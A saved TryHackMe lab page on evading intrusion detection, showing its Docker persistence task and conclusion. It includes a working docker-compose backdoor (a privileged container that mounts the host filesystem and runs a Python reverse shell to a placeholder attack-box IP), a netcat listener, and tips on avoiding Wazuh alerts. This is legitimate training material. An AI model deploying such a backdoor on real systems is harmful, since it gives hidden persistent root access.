+            <div class="room-task-desc-data"> <p>The compromised host is running Linux so we have a number of persistence mechanisms available to us. The first option which, is arguably the most straightforward is to add a public key that we control to the authorized_keys file at <code>/root/.ssh/</code>. This would allow us to connect to the host via SSH without needing to run the privilege escalation exploit every time and without relying on the password for the compromised account not changing. This methodology is very common among botnets as it's both reliable and very simple to implement as pretty much all Linux distributions indented for server use run an Open-SSH service by default. </p><p>Try this now, a valid key pair can be generated for the attack box by running <code>ssh-keygen</code>. Once this key is added to the authorized_keys file in&nbsp;<code>/root/.ssh/</code> you should be able to gain remote access to root whenever it's needed, simple right? Well, unfortunately, this tactic has one big disadvantage as it is highly detectable. </p><p>HIDS often feature some form of file system integrity monitoring service which, will periodically scan a list of target directories for changes with, an alert being raised every time a file is changed or added. By adding an entry to the <code>authorized_keys</code> file you would have triggered an alert of a fairly high severity and as a result, this might not be the best option. An alert is also raised every time an ssh connection is made so the HIDS operator will be notified every time we log on.</p><p>It would be very helpful to check how the IDS is configured before we continue as it may help us with finding vectors that aren't monitored. Wazuh has two configuration modes, local and centralised in this case, the HIDS agents are setup locally and the config file can be found at <code>/var/ossec/etc/ossec.conf </code>. This file lists all of the data sources that are covered by HIDS in this case, the following are enabled:</p><ul><li><b>File system monitoring</b> - As already mentioned this affects our ability to simply install ssh keys but, this also affects other persistence vectors like, <code>cron</code>, <code>systemd</code> and any attacks that require the installation of additional tools.</li><li><b>System log collection</b> - This functionality will generate alerts when some post-exploitation actions are taken against the system like making SSH connections and login attempts.</li><li><b>System inventory</b> - This tracks system metrics like open ports, network interfaces, packages, and processes. This affects our ability to open new ports for reverse shells and install new packages. Note, that this function currently, does not generate alerts by itself and requires the HIDS operator to write their own rules. However, A report would be available on an upstream log analysis platform like Kibana&nbsp; <br></li></ul><p>Note, that Docker monitoring is also available, however, it is not enabled in this case which gives us a few options:</p><ul><li>We could hijack the existing container supply chain and use it to install a backdoor into one of the containers that are hosted by the system. This would be difficult to detect without additional container monitoring and scanning technology. Credentials for a docker registry could either be phished or extracted from<code> /root/.docker/config.json</code><span style="font-family:monospace"> </span>as, this location stores the credentials used with the <code>docker login</code><span style="font-family:monospace"> <span style="font-family:&quot;Ubuntu&quot;">command in plaintext</span>.&nbsp;<span style="font-family:&quot;Ubuntu&quot;">This won't work in this case though, as the host we compromised doesn't have internet access and there are no credentials in </span></span><code>/root/.docker/config.json</code><span style="font-family:monospace"><span style="font-family:&quot;Ubuntu&quot;">.</span></span><span style="font-family:monospace"><br></span></li><li>We could modify the existing docker-compose setup to include a privileged SSH enabled container and mount the host's file system to it with <code>-v /:/hostOS</code>. The docker-compose file used to define the current setup isn't monitored by the file system integrity monitor as it's in <code>/var/lib.</code> Again though, this won't work well in this case as we don't have access to the internet though, you could transport the container images from the attack box to the compromised VM via SSH. You would also need to open up a new port for the ssh connection which, would show up on the system inventory report.<br></li><li>We could modify an existing or new docker-compose setup by, abusing the <code>entrypoint</code> option to grant us a reverse shell. Using docker-compose also allows us to specify automatic restarts which increases the backdoor's resilience. This option also reverses the typical client-server connection model so, we won't need to open any new ports on the host. <br></li></ul><p>To perform the last option append the following to a new docker-compose file:</p><div style="color:rgb(212, 212, 212);background-color:rgb(30, 30, 30);font-family:&quot;Droid Sans Mono&quot;, &quot;monospace&quot;, monospace, &quot;Droid Sans Fallback&quot;;font-weight:normal;font-size:14px;line-height:19px;white-space:pre;--darkreader-inline-color:#a4a09b;--darkreader-inline-bgcolor:#121314"><div><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">---</span></div><div><span style="color:rgb(86, 156, 214);--darkreader-inline-color:#4d83ad">version</span><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">: </span><span style="color:rgb(206, 145, 120);--darkreader-inline-color:#a67662">"2.1"</span></div><div><span style="color:rgb(86, 156, 214);--darkreader-inline-color:#4d83ad">services</span><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">:</span></div><div><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">  </span><span style="color:rgb(86, 156, 214);--darkreader-inline-color:#4d83ad">backdoorservice</span><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">:</span></div><div><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">    </span><span style="color:rgb(86, 156, 214);--darkreader-inline-color:#4d83ad">restart</span><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">: </span><span style="color:rgb(206, 145, 120);--darkreader-inline-color:#a67662">always</span></div><div><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">    </span><span style="color:rgb(86, 156, 214);--darkreader-inline-color:#4d83ad">image</span><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">:</span><span style="color:rgb(206, 145, 120);--darkreader-inline-color:#a67662"> ghcr.io/jroo1053/ctfscore:master</span></div><div><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">    </span><span style="color:rgb(86, 156, 214);--darkreader-inline-color:#4d83ad">entrypoint</span><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">: &gt; </span><span style="color:rgb(206, 145, 120);--darkreader-inline-color:#a67662"><br>       python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);</span></div><div><span style="color:rgb(206, 145, 120);--darkreader-inline-color:#a67662">       s.connect(("&lt;ATTACKBOXIP&gt;",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);</span></div><div><span style="color:rgb(206, 145, 120);--darkreader-inline-color:#a67662">       pty.spawn("/bin/sh")'</span></div><div><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">    </span><span style="color:rgb(86, 156, 214);--darkreader-inline-color:#4d83ad">volumes</span><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">:</span></div><div><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">      - </span><span style="color:rgb(206, 145, 120);--darkreader-inline-color:#a67662">/:/mnt</span></div><div><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">    </span><span style="color:rgb(86, 156, 214);--darkreader-inline-color:#4d83ad">privileged</span><span style="color:rgb(212, 212, 212);--darkreader-inline-color:#a4a09b">: </span><span style="color:rgb(86, 156, 214);--darkreader-inline-color:#4d83ad">true</span></div></div><p><br></p><p>This will create a new docker container using an image that's already available on the system, mount the entire host file system to <code>/mnt/</code>on the container and spawn a reverse shell with python. Listen for the reverse shell connection on the attack box with:<br></p><p><code>nc -lvnp 4242</code></p><p>Then start the service on the host with:</p><p><code>docker-compose up</code><br></p><p>Once these are performed you should have a way to access the vulnerable host without relying on SSH, a vulnerable service, or user credentials. Of course, you will still be able to use these other methods in conjunction with the docker-compose reverse shell as, backups.</p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Abuse docker to establish a backdoor on the host system<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="11">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Completed
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div><div class="card" id="task-12">
+                    <div class="card-header task-header" data-toggle="collapse" href="#collapse12">
+                        <a class="card-link">
+                            <span class="task-dropdown-title red">Task 12                             <span class="task-dropdown-icon"><i class="far fa-circle text-lgray"></i></span></span> Conclusion
+                            <span class="float-right"><i class="fas fa-chevron-down"></i></span>
+                            <span class="task-resources"></span>
+                        </a>
+                    </div>
+                    <div id="collapse12" class="collapse " data-parent="#taskContent">
+                        <div class="card-body task-incomplete">
+                            <div class="room-task-desc">
+            <div class="room-task-desc-data"> <p>I hope you've enjoyed this room and learned a few things. As previously mentioned this room was the first public test of the CTF scoring system project I've been developing. I have enclosed a link to the source code for the scoring system, It's licensed under AGPL-3.0 so feel free to modify it or add the system to your own CTF. There's documentation on installation and configuration available in the repo as well as links to prebuilt docker images. </p><p>Repo Link: <a href="https://github.com/Jroo1053/CTFScore" target="_blank">https://github.com/Jroo1053/CTFScore</a><br></p><p>Thanks for playing. <br></p></div>
+        </div>
+        
+        <div class="room-questions-split vertical-align-custom red">
+            <div>Answer the questions below</div>
+        </div>
+        
+                            <div class="room-task-questions">
+                            <div class="room-task-question-no vertical-align-custom">
+                                
+                            </div>
+                            <div class="room-task-question-details">
+                                Read the above<br>
+                            </div>
+                        </div>
+
+                    <div class="room-task-input">
+                        <div class="room-task-input-questions">
+                            <input type="text" class="form-control room-answer-field" placeholder="No answer needed" value="" disabled="">
+                            <input type="hidden" value="1">
+                            <input type="hidden" value="12">
+                        </div>
+                        <div class="room-task-input-answer">
+                            <button type="button" class="btn btn-outline-success task-answer" onclick="answerQuestion(this)">
+                            <i class="far fa-paper-plane"></i> Completed
+                        </button>
+                        </div>
+                        
+                    </div>
+                        </div>
+                    </div>
+                </div></div>
+</div>
+<div id="room-simple-details"><div class="card cd-2 text-center mt-3"><div class="card-body"><p class="size-18">Created by <img class="avatar-tiny" src="./TryHackMe _ Intrusion Detection_files/dadf5f3f95a13ad0b921ea764d96b16b.png"> 
+        <a class="green-link" href="https://tryhackme.com/p/CoolComputerMan">CoolComputerMan</a></p><p class="mb-0">This is a <b>free</b> room, which means anyone can deploy virtual machines in the room 
+        (without being subscribed)! 3211 users are in here and this room is 460 days old.</p></div></div></div>
+
+</div>
+</div>
+</div>
+<div id="room-content-attackbox">
+<div id="room-attackbox">
+<div id="attackbox-machine-instance">
+<div id="room-attackbox-loading"></div>
+<div id="room-attackbox-vm-view"></div>
+</div>
+<div id="attackbox-machine-options">
+<div class="d-flex">
+<a target="_blank" id="room-attackbox-url" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="View in full screen"></a>
+<div onclick="extendHourWebBasedVM(null)" class="hover-pointer" id="room-attackbox-extend" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Extend machines timer"><i class="fas fa-plus"></i></div>
+<div onclick="terminateWebBasedVM(null)" class="hover-pointer" id="room-attackbox-terminate" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Terminate Machine"><i class="far fa-power-off"></i></div>
+<div onclick="exitViewAttackBox()" class="hover-pointer" id="room-attackbox-exitview" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Exit split view"><i class="fas fa-minus"></i></div>
+<div onclick="infoAttackBox()" class="hover-pointer faded" id="room-attackbox-info" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Machine Information"><i class="fas fa-info"></i></div>
+<div class="d-flex" id="room-attackbox-tabs"></div>
+</div>
+<div id="room-attackbox-expire-text" data-toggle="tooltip" data-placement="top" title="" data-container="#room-content" data-original-title="Time left until your AttackBox expires"></div>
+</div>
+</div>
+<div class="modal fade" id="attackBoxInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header modal-light-gray">
+<h5 class="modal-title m-auto">Web-Based Machine Information</h5>
+</div>
+<div class="modal-body">
+<p>Use the web-based machine to attack other target machines you start on TryHackMe.</p>
+<ul class="normalList text-gray mt-3 mb-4">
+<li>Public IP: <code id="browser-machine-pubip" class="dark size-14"></code></li>
+<li class="mt-1">Private IP: <code id="browser-machine-privip" class="dark size-14"></code> <span class="size-14">(Use this for your reverse shells)</span></li>
+<li class="mt-1">Username: <code id="browser-username" class="dark size-14"></code></li>
+<li class="mt-1">Password: <code id="browser-password" class="dark size-14"></code></li>
+<li class="mt-1">Protocol: <code id="browser-protocol" class="dark size-14"></code></li>
+</ul>
+<hr class="hr-min">
+<ul class="text-lgray mb-0">
+<li class="mt-2">To copy to and from the browser-based machine, highlight the text and press <b>CTRL+SHIFT+C</b> <details><summary>or use the clipboard</summary><img src="./TryHackMe _ Intrusion Detection_files/clipboard.gif"></details></li>
+<li class="mt-2">When accessing target machines you start on TryHackMe tasks, make sure you're using the correct IP (it <b>should not be</b> the IP of your AttackBox)</li>
+</ul>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="award-modal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-body text-center">
+<button type="button" class="close size-30 text-lgray" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+<div id="award-modal-badges"></div>
+<p class="mb-0 text-lgray size-18">Complete the room to earn this badge</p>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="hint-modal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header modal-dark-blue">
+<h5 class="modal-title"><i class="fal fa-lightbulb-on"></i> Question Hint</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body"></div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="modal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header">
+<h5 class="modal-title">...</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body text-center"></div>
+<div class="modal-footer"></div>
+</div>
+</div>
+</div>
+<link rel="stylesheet" href="./TryHackMe _ Intrusion Detection_files/modal.css">
+<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered" role="document">
+<div class="modal-content" id="roomCompletedModalContent">
+<div class="modal-body text-center">
+<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
+<i class="fad fa-times-circle"></i>
+</button>
+<div class="icon-box">
+<i class="fad fa-badge-check"></i>
+</div>
+<h3 class="text-accent mt-5">Congratulations</h3>
+<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
+<h2 id="roomCompleted-share"></h2>
+<div id="ticket-info"></div> 
+<p class="faded mt-1" id="roomFeedbackBtn">
+<small>
+<button class="bg-white border-0">Leave
+feedback</button>
+</small>
+</p>
+<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
+<input type="hidden" name="_csrf" value="3cvrNZii-4L0zgdexxNe80r7fSL91LqLfuqU">
+<input type="hidden" name="roomCode" value="idsevasion">
+<input type="hidden" name="type" value="rooms">
+<input type="hidden" name="redirect" value="json">
+<div class="form-group">
+<label class="mb-0" for="like">What do you like about the room?</label>
+<textarea type="text" name="like" id="like" class="form-control"></textarea>
+</div>
+<div class="form-group">
+<label class="mb-0" for="dislike">What don't you like about the room?</label>
+<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
+</div>
+<div class="form-group">
+<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
+<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
+</div>
+<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
+</form>
+<p class="mt-2 mb-0" id="formMessage"></p>
+</div>
+</div>
+</div>
+<script>
+    function dismissRoomCompleteModal() {
+      $('#roomCompleted').modal('hide');
+
+      const shouldSeeReferralModal = ""
+      if (shouldSeeReferralModal) {
+        $('#unlockCreditModal').modal('show');
+
+        referralModalEvent('view');
+      }
+    }
+
+    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
+  </script>
+</div>
+<script src="./TryHackMe _ Intrusion Detection_files/roomFeedback.js"></script>
+<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
+<div class="modal-dialog modal-dialog-centered" role="document">
+<div class="modal-content">
+<div class="modal-header modal-dark-blue">
+<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body text-center">
+<div class="row vertical-align-custom mb-0">
+<div class="col-sm-5 pr-0">
+<p class="size-18 bold">Use a VPN</p>
+<p>Connect to our network via a VPN</p>
+<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
+</div>
+<div class="col-sm-2 size-24">
+or
+</div>
+<div class="col-sm-5 pl-0">
+<p class="size-18 bold">Use the AttackBox</p>
+<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
+<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
+<div class="modal-content">
+<div class="modal-body text-center">
+<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
+<h3 class="text-warning">Expiring Soon</h3>
+<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
+</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
+<div class="modal-content">
+<div class="modal-body text-center">
+<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
+<h3 class="text-danger">Expired Machine</h3>
+<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
+</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+<div class="modal-content">
+<div class="modal-header modal-dark-blue text-center p-3">
+<h4 class="mb-0 m-auto">How to access machines</h4>
+<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body text-center">
+<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
+<div class="row mb-0">
+<div class="col-sm-6">
+<img src="./TryHackMe _ Intrusion Detection_files/connect_openvpn_short.png">
+<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
+</div>
+<div class="col-sm-6">
+<img src="./TryHackMe _ Intrusion Detection_files/connect_kali_short.png">
+<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered" role="document">
+<div class="modal-content">
+<div class="modal-header modal-dark-blue">
+<h5 class="modal-title" id="roomAlertModalTitle"></h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body" id="roomAlertModalBody"></div>
+<div class="modal-footer">
+<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="resetUserProgressModal" role="dialog">
+<div class="modal-dialog" role="document">
+<div class="modal-content">
+<div class="modal-header">
+<h5 class="modal-title">Reset Your Progress</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body">
+<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
+</div>
+<div class="modal-footer">
+<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
+<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
+<div class="modal-content">
+<div class="modal-header  modal-dark-blue">
+<h5 class="modal-title">Cloud Information</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body">
+<ul class="nav nav-tabs">
+<li class="nav-item pr-2">
+<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/idsevasion#env-tab">Environment</a>
+</li>
+<li class="nav-item">
+<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/idsevasion#creds-tab">Credentials</a>
+</li>
+</ul>
+<div class="tab-content">
+<div class="tab-pane active" id="env-tab"></div>
+<div class="tab-pane" id="creds-tab"></div>
+</div>
+</div>
+<div class="modal-footer" id="cloudEnvModalFooter">
+</div>
+</div>
+</div>
+</div>
+<div class="modal fade" id="setNameModal" role="dialog">
+<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
+<div class="modal-content">
+<div class="modal-header modal-dark-blue">
+<h5 class="modal-title">Generating Your Certificate</h5>
+<button type="button" class="close" data-dismiss="modal" aria-label="Close">
+<span aria-hidden="true">×</span>
+</button>
+</div>
+<div class="modal-body container">
+<div class="row">
+<div class="col-6">
+<h5 class="bold">Hey there, what's your name?</h5>
+<p class="text-secondary">
+If you want your name to appear on your certificate, please fill the field below.
+</p>
+<div class="form-group">
+<label>Full Name </label>
+<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
+<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
+</div>
+</div>
+<div class="col-6">
+<h5 class="bold">You're here incognito? It's ok!</h5>
+<p class="text-secondary">If you chose skip, your username will be used instead!</p>
+</div>
+</div>
+<div class="row">
+<div class="col-6">
+<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
+Generate with my full name
+</button>
+</div>
+<div class="col-6">
+<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
+Generate with my username
+</button>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<script src="./TryHackMe _ Intrusion Detection_files/certificateName.js"></script>
+<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
+<div class="modal-dialog modal-dialog-slideout" role="document">
+<div class="modal-content">
+<div class="modal-body">
+<div id="slideout-links">
+<div id="unstuck-video" class="unstuck-group" style="display: none;">
+<div class="unstuck-icon"><i class="fas fa-play"></i></div>
+<div class="unstuck-icon-text">Video Solution</div>
+</div>
+<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
+<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
+<div class="unstuck-icon-text">Writeups</div>
+</div>
+<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/62570fa0d2607c8db142c81d">
+<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
+<div class="unstuck-icon-text">Forum Post</div>
+</a>
+<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
+<div class="unstuck-icon"><i class="fas fa-books"></i></div>
+<div class="unstuck-icon-text">Knowledge Base</div>
+</a>
+<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
+<div class="unstuck-icon"><i class="fas fa-users"></i></div>
+<div class="unstuck-icon-text">Ask Community</div>
+</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+<style>
+
+    #navConnModal .modal-body{
+        position: relative;
+    }
+
+    #nav-openvpn,
+    #nav-attackbox {
+        display: none;
+    }
+
+    #nav-openvpn .nav-pills .nav-link.active,
+    #nav-openvpn .nav-pills .show>.nav-link {
+        background-color: #ec8e3d;
+        color: white;
+    }
+    #nav-openvpn .nav-link {
+        color: #909090;
+    }
+    #nav-openvpn a,
+    #nav-attackbox a {
+        color: #ec8e3d;
+    }
+
+    #nav-openvpn code.dark {
+        background-color: #7d400a;
+        color: #fff;
+    }
+
+    #slideout-bk {
+        display: none;
+        padding: 10px 15px;
+        opacity: 0.8;
+        cursor: pointer;
+    }
+
+    #slideout-bk:hover {
+        opacity: 1;
+    }
+
+    #slideout-conn-hideip {
+        display: none;
+        position: absolute;
+        bottom: 8px;
+        right: 8px;
+        opacity: 0.7;
+        cursor: pointer;
+    }
+
+    #slideout-conn-hideip:hover {
+        opacity: 1;
+    }
+
+</style>
+<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
+<div class="modal-dialog modal-dialog-slideout" role="document">
+<div class="modal-content">
+<div class="modal-body">
+<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
+<div id="slideout-conn-options">
+<div id="slideout-conn-header" class="text-center">
+<img class="slideout-connect-img" src="./TryHackMe _ Intrusion Detection_files/tryhackme_connect.png">
+<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
+</div>
+<div class="m-3 text-center">
+<p>To access target machines you need to either:</p>
+<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
+<div class="col-md-12 mb-3">
+<a class="clear-link preventDefault" href="https://tryhackme.com/room/idsevasion#" onclick="showAttackBoxSteps()">
+<div class="card card-body">
+<div class="row vertical-align-custom">
+<div class="col col-2 text-center faq-quicklinks-icons">
+<i class="far fa-laptop"></i>
+</div>
+<div class="col">
+<div class="faq-quicklinks-title size-18">AttackBox</div>
+<p class="faded mb-0">Use a browser-based attack machine</p>
+</div>
+</div>
+</div>
+</a>
+</div>
+<div class="col-md-12">
+<a class="clear-link preventDefault" href="https://tryhackme.com/room/idsevasion#" onclick="showVPNSteps()">
+<div class="card card-body">
+<div class="row vertical-align-custom">
+<div class="col col-2 text-center faq-quicklinks-icons">
+<i class="far fa-key"></i>
+</div>
+<div class="col">
+<div class="faq-quicklinks-title size-18">OpenVPN</div>
+<p class="faded mb-0">Connect to our network via a VPN</p>
+</div>
+</div>
+</div>
+</a>
+</div>
+</div>
+</div>
+</div>
+<div id="faqCards" class="p-3">
+<div id="nav-openvpn">
+<div class="mb-3">
+<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
+</div>
+<div class="text-center">
+<h4>What Operating System are you using?</h4>
+<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
+<li class="nav-item m-3">
+<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/idsevasion#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
+</li>
+<li class="nav-item m-3">
+<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/idsevasion#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
+</li>
+<li class="nav-item m-3">
+<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/idsevasion#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
+</li>
+</ul>
+<div class="tab-content text-left">
+<div class="tab-pane fade" id="pills-windows" role="tabpanel">
+<ol>
+<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
+<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
+<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
+<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Intrusion Detection_files/win_ran_admin.png"></li>
+<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Intrusion Detection_files/win_import.png"></li>
+<li class="mt-2">Select the configuration file you downloaded earlier.</li>
+<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Intrusion Detection_files/win_connect.png"></li>
+</ol>
+</div>
+<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
+<ol>
+<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
+<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
+<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
+<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
+</ol>
+</div>
+<div class="tab-pane fade" id="pills-macos" role="tabpanel">
+<ol>
+<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
+<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
+<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Intrusion Detection_files/mac_installer.png"></li>
+<li class="mt-2">Open and run the OpenVPN GUI application.</li>
